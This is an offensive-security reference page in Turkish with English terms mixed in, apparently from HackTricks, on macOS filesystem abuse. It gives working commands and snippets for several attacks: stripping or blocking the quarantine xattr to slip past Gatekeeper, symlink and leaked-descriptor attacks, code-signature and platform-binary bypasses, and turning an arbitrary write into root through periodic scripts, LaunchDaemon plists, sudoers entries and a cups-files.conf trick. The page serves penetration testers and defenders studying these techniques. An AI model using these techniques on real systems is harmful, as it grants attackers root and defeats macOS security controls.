# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

**directory** içindeki izinler:

- **read** - directory entries'larını **enumerate** edebilirsiniz
- **write** - directory içindeki **files**'ları **delete/write** edebilir ve **empty folders**'ları **delete** edebilirsiniz.
- Ancak üzerinde write permissions bulunmadıkça **non-empty folders**'ları **delete/modify** edemezsiniz.
- Sahibi olmadığınız sürece bir **folder**'ın adını **modify** edemezsiniz.
- **execute** - directory'yi **traverse** etmenize **allowed** olduğunuz anlamına gelir - bu hakka sahip değilseniz içindeki herhangi bir **files**'a veya **subdirectories** içindeki dosyalara erişemezsiniz.

### Dangerous Combinations

**root tarafından sahip olunan bir file/folder nasıl overwrite edilir**, ancak:

- Path içindeki bir parent **directory owner** kullanıcıdır
- Path içindeki bir parent **directory owner**, **write access** sahibi bir **users group**'tur
- Bir users **group**, **file** üzerinde **write** access'e sahiptir

Önceki kombinasyonlardan herhangi biriyle attacker, ayrıcalıklı bir arbitrary write elde etmek için beklenen path'e bir **sym/hard link** **inject** edebilir.

### Folder root R+X Special case

Bir **directory** içinde, **only root has R+X access** olan files varsa, bunlara başka hiç kimse **accessible** değildir. Bu nedenle, bir user tarafından okunabilen ancak bu **restriction** nedeniyle okunamayan bir file'ı bu folder'dan **different one** konumuna **move** etmeye izin veren bir vulnerability, bu files'ları okumak için abuse edilebilir.

Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

Ayrıcalıklı bir process, **lower privileged user** tarafından **controlled** edilebilecek veya daha önce **lower privileged user** tarafından oluşturulmuş olabilecek bir **file**'a data yazıyorsa, user bunu bir Symbolic veya Hard link aracılığıyla başka bir file'a **point** edebilir ve ayrıcalıklı process bu file'a yazacaktır.

Bir attacker'ın **arbitrary write**'ı **escalate privileges** için **abuse** edebileceği diğer bölümlere bakın.

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)'a göre: *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Yalnızca **final** component kontrol edilir — her **intermediate** component hâlâ resolve edilir ve takip edilir. Bu nedenle `O_NOFOLLOW` ile bir write'ı "koruyan" developer, target path'in herhangi bir **parent directory**'sine symlink yerleştirilerek hâlâ attack edilebilir.

Aynı man page, bu açığı gerçekten kapatan flag'leri belgeler:

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

Aksi takdirde, önceden validate ettiğiniz bir directory FD'ye göre relative `openat()` kullanmak veya `realpath()` + yeniden validation yapmak, path'in ortasındaki symlink swap'lerini durdurmanın kalan yollarıdır.

## .fileloc

**`.fileloc`** extension'ına sahip files, diğer applications veya binaries'lere point edebilir; böylece açıldıklarında application/binary execute edilen olur.\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Dosya Tanımlayıcıları

### Leak FD (`O_CLOEXEC` yok)

`open` çağrısında `O_CLOEXEC` bayrağı yoksa dosya tanımlayıcı child process tarafından devralınır. Dolayısıyla ayrıcalıklı bir process ayrıcalıklı bir dosyayı açar ve attacker tarafından kontrol edilen bir process çalıştırırsa attacker **ayrıcalıklı dosyanın FD'sini devralır**.

Bunun canonical örneği **OS X 10.10'daki `DYLD_PRINT_TO_FILE` LPE'sidir** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):

- `dyld`, söz konusu değişken `processDyldEnvironmentVariable()` dışında parse edildiği için **restricted (suid root) binary'lerde** bile `DYLD_PRINT_TO_FILE=/path` değerini kabul ediyordu.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` çağrısını yapıyordu; bu nedenle **keyfi bir path'te root-owned bir dosya oluşturuyordu**.
- FD **hiç kapatılmıyor ve close-on-exec bayrağı bulunmuyordu**; bu nedenle suid binary'nin her child process'i **root-owned bir dosyaya yazılabilir FD'yi devralıyordu**.
- Örneğin `DYLD_PRINT_TO_FILE=/etc/target suid_binary` çalıştırıp ardından child process'te devralınan FD numarasını okumak, root-owned dosyalara keyfi yazma olanağı sağlıyordu; `fcntl(fd, F_SETFL, 0)` ise `O_APPEND` değerini temizleyerek append yerine üzerine yazmaya bile izin veriyordu.

Aynı durum, ayrıcalıklı bir process kontrol ettiğiniz bir şeyi `exec` etmeden **önce** bir dosya açtığında da ortaya çıkar (helper tools, `$EDITOR` aracılığıyla çağrılan `crontab` tarzı editörler, bir env-var path'inden açılan log/debug dosyaları...). Devraldığınız FD'leri şu komutla listeleyin:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` değerinin üzerindeki ve kendi başınıza açamadığınız bir dosyayı işaret eden her şey, arbitrary-write (veya arbitrary-read) primitive'idir.

## quarantine xattrs tricks'ten kaçının

### Kaldırma
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Bir dosya/klasör bu immutable özniteliğine sahipse, üzerine bir xattr eklemek mümkün olmaz.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr desteği olmayan dosya sistemleri

macOS'un bağlayabildiği her dosya sistemi **extended attributes**'ı yerel olarak depolamaz. HFS+ ve APFS bunu destekler; **FAT32, exFAT ve (çoğu) NFS mount'u desteklemez** — macOS, bunları `._<filename>` adlı bir **AppleDouble** yan dosyası yazarak emüle eder ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

Bu durum quarantine için önemlidir, çünkü xattr yalnızca aynı volume'dan gerçekten yazılabiliyor **ve tekrar okunabiliyorsa** varlığını korur:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Birim daha sonra `._` eşlikçi dosyasını yok sayan bir yoldan okunursa (veya eşlikçi dosya kaldırılır/silinirse), dosya **quarantine flag olmadan** gelir — ve karantinaya alınmamış bir `.app`, [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) bölümünde ele alındığı üzere App Sandbox'tan kaçmak için yeterlidir.

### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** dosya formatı, bir dosyayı ACE'leriyle birlikte kopyalar.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin gösteriminin sıkıştırılmış dosyada ACL olarak ayarlanacağını görmek mümkündür. Bu nedenle, başka xattr'ların yazılmasını engelleyen bir ACL ile **AppleDouble** dosya formatını kullanarak bir uygulamayı zip dosyasına sıkıştırırsanız quarantine xattr'ı uygulamaya ayarlanmaz:

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) göz atın.

Bunu tekrarlamak için öncelikle doğru acl dizesini elde etmemiz gerekir:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not: Bu çalışsa bile sandbox önce quarantine xattr'ını yazar)

Gerçekten gerekli değil ancak her ihtimale karşı burada bırakıyorum:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## İmza kontrollerini Bypass etme

### Platform binary kontrollerini Bypass etme

Bazı security kontrolleri, örneğin bir XPC service'e bağlanmaya izin vermek için binary'nin bir **platform binary** olup olmadığını kontrol eder. Ancak https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ adresindeki bypass yönteminde gösterildiği üzere, bir platform binary (örneğin /bin/ls) edinip exploit'i `DYLD_INSERT_LIBRARIES` env variable'ı aracılığıyla dyld kullanarak inject ederek bu kontrolü bypass etmek mümkündür.

### `CS_REQUIRE_LV` ve `CS_FORCED_LV` flag'lerini Bypass etme

Çalışan bir binary'nin, aşağıdaki gibi bir kodla kendi flag'lerini değiştirerek kontrolleri bypass etmesi mümkündür:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures Bypass

Bundle'lar, **bundle** içindeki her bir **file**'ın **hash** değerini içeren **`_CodeSignature/CodeResources`** dosyasına sahiptir. CodeResources'ın hash değerinin de **executable** içine **embedded** edildiğini unutmayın; bu nedenle onunla da oynayamayız.

Ancak bazı dosyaların signature'ı kontrol edilmez; bunlar plist içinde `omit` key'ine sahiptir, örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Bir kaynağın imzasını CLI üzerinden hesaplamak mümkündür:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmgs Bağlama

Bir kullanıcı, mevcut bazı klasörlerin üzerine bile özel olarak oluşturulmuş bir dmg bağlayabilir. Özel içerikle bir dmg paketi şu şekilde oluşturulabilir:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Genellikle macOS, `/usr/libexec/diskarbitrationd` tarafından sağlanan `com.apple.DiskArbitrarion.diskarbitrariond` Mach service ile iletişim kurarak diskleri mount eder. LaunchDaemons plist dosyasına `-d` parametresi eklenip yeniden başlatılırsa logları `/var/log/diskarbitrationd.log` dosyasına kaydeder.\
Ancak `com.apple.driver.DiskImages` kext ile doğrudan iletişim kurmak için `hdik` ve `hdiutil` gibi araçları kullanmak mümkündür.

## Keyfi Yazmalar

### Periodic sh scriptleri

Script'iniz **shell script** olarak yorumlanabiliyorsa her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell script'inin üzerine yazabilirsiniz.

Bu script'in çalıştırılmasını şu komutla **taklit edebilirsiniz**: **`sudo periodic daily`**

### Daemon'lar

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** gibi bir **LaunchDaemon** yazarak, herhangi bir script'i çalıştıran bir plist oluşturabilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh` dosyasını, root olarak çalıştırmak istediğiniz **komutlarla** oluşturun.

### Sudoers Dosyası

**Arbitrary write** yetkiniz varsa, kendinize **sudo** ayrıcalıkları tanıyan bir dosyayı **`/etc/sudoers.d/`** klasörü içinde oluşturabilirsiniz.

### PATH dosyaları

**`/etc/paths`** dosyası, PATH env değişkenini dolduran ana konumlardan biridir. Üzerine yazmak için root olmanız gerekir; ancak **privileged process** bir script, **full path** belirtmeden herhangi bir **komut** çalıştırıyorsa, bu dosyayı değiştirerek onu **hijack** edebilirsiniz.

Yeni klasörleri **PATH** env değişkenine yüklemek için **`/etc/paths.d`** içine de dosyalar yazabilirsiniz.

### cups-files.conf

Bu teknik [this writeup](https://www.kandji.io/blog/macos-audit-story-part1) içinde kullanılmıştır.

Aşağıdaki içeriğe sahip **`/etc/cups/cups-files.conf`** dosyasını oluşturun:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Bu, `/etc/sudoers.d/lpe` dosyasını 777 izinleriyle oluşturur. Sondaki ekstra gereksiz içerik, hata günlüğü oluşturmayı tetiklemek içindir.

Ardından, `/etc/sudoers.d/lpe` dosyasına `%staff ALL=(ALL) NOPASSWD:ALL` gibi privilege escalation için gereken config'i yazın.

Sonra `/etc/cups/cups-files.conf` dosyasını tekrar değiştirerek `LogFilePerm 700` belirtin; böylece yeni sudoers dosyası `cupsctl` çağrıldığında geçerli hale gelir.

### Sandbox Escape

Bir FS arbitrary write ile macOS sandbox'ından escape etmek mümkündür. Bazı örnekler için [macOS Auto Start](../../../../macos-auto-start-locations.md) sayfasını inceleyin; ancak yaygın bir yöntem, başlangıçta bir command çalıştıran bir Terminal preferences dosyasını `~/Library/Preferences/com.apple.Terminal.plist` konumuna yazmak ve bunu `open` kullanarak çağırmaktır.

## Diğer kullanıcılar olarak writable dosyalar oluşturma

Çok yaygın bir privesc primitive'i, **privileged bir process'in sizin için kontrol ettiğiniz bir directory içinde bir file oluşturmasını** sağlamak ve ardından bu file üzerindeki **write access**'i korumaktır. Bunun için iki bileşen gerekir:

1. Sahip olduğunuz bir directory (veya **inheritable ACL** ayarlayabildiğiniz bir directory); böylece içinde oluşturulan her şey izinlerinizi devralır.
2. Bir debug/logging environment variable, config file veya helper'ın XPC API'si aracılığıyla **nerede** bir file oluşturacağının belirtilebildiği privileged/`suid` bir process.

**Inheritable ACL** bölümü, oluşturulan file başka bir kullanıcıya ait olsa bile sizin tarafınızdan writable olmasını sağlar. `file_inherit` / `directory_inherit` inheritance flag'leri [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) içinde belgelenmiştir:
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Şimdi ayrıcalıklı bir process'in `$DIRNAME` içinde oluşturduğu her dosya **sizin tarafınızdan yazılabilir**. Bu dizin daha sonra **root olarak çalıştırılan** bir konumsa (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, bir LaunchDaemon dizini...), bu doğrudan root escalation sağlar. Dosyaya sahip olduktan sonra ne yazmanız gerektiği için yukarıdaki [Sudoers File](#sudoers-file) ve [cups-files.conf](#cups-filesconf) bölümlerine bakın.

"env variable bir root process'inin dosya oluşturmasına neden olur ve FD size leak olur" zincirinin tam ve uygulamalı bir örneği için yukarıdaki [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) bölümüne bakın.

## POSIX Shared Memory

**POSIX shared memory**, POSIX uyumlu işletim sistemlerindeki process'lerin ortak bir memory alanına erişmesine olanak tanır ve diğer inter-process communication yöntemlerine kıyasla daha hızlı iletişim sağlar. Bu işlem, `shm_open()` ile bir shared memory object oluşturmayı veya açmayı, boyutunu `ftruncate()` ile ayarlamayı ve `mmap()` kullanarak process'in address space'ine map etmeyi içerir. Process'ler daha sonra bu memory alanından doğrudan okuyabilir ve bu alana yazabilir. Concurrent access'i yönetmek ve data corruption'ı önlemek için genellikle mutex veya semaphore gibi synchronization mechanism'leri kullanılır. Son olarak process'ler `munmap()` ve `close()` ile shared memory'nin mapping'ini kaldırır ve bağlantısını kapatır; isteğe bağlı olarak memory object'i `shm_unlink()` ile kaldırır. Bu sistem, birden fazla process'in shared data'ya hızlı ve verimli şekilde erişmesi gereken ortamlarda etkili bir IPC yöntemidir.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Tüketici Kod Örneği</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors**, user uygulamalarındaki **file descriptor işlemlerinin** güvenliğini ve güvenilirliğini artırmak için macOS'ta sunulan bir security feature'dır. Bu guarded descriptors, file descriptor'larla belirli kısıtlamaları veya "guard"ları ilişkilendirmek için bir yöntem sağlar; bu kısıtlamalar kernel tarafından uygulanır.

Bu feature, **yetkisiz file access** veya **race conditions** gibi belirli security vulnerabilities sınıflarını önlemek için özellikle kullanışlıdır. Bu vulnerabilities, örneğin bir thread'in bir file description'a erişerek **başka bir vulnerable thread'e erişim sağlaması** veya bir file descriptor'ın **vulnerable child process** tarafından **inherit edilmesi** durumunda ortaya çıkar. Bu işlevle ilişkili bazı functions şunlardır:

- `guarded_open_np`: Bir FD'yi guard ile açar
- `guarded_close_np`: Kapatır
- `change_fdguard_np`: Bir descriptor üzerindeki guard flags'lerini değiştirir (guard protection'ı kaldırmak dahil)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (close-on-exec olmadan leaked FD)
- [The Eclectic Light Company - Hangi file systems ve cloud services extended attributes'ı korur?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper'ın Achilles heel'i: Bir macOS vulnerability'sini ortaya çıkarmak](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
